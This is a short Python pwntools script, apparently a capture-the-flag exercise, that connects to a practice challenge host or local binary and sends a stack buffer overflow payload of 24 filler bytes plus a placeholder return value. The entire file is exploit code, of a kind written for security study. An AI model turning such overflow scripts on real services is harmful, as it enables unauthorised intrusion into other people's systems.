from pwn import *

target = remote("pwn-study.katagaitai-ctf.com", 9020)
# target = process("./chall")

payload = b"A" * 24
payload += p64(0xdeadbeef)

target.sendline(payload)
print(target.recvall().decode())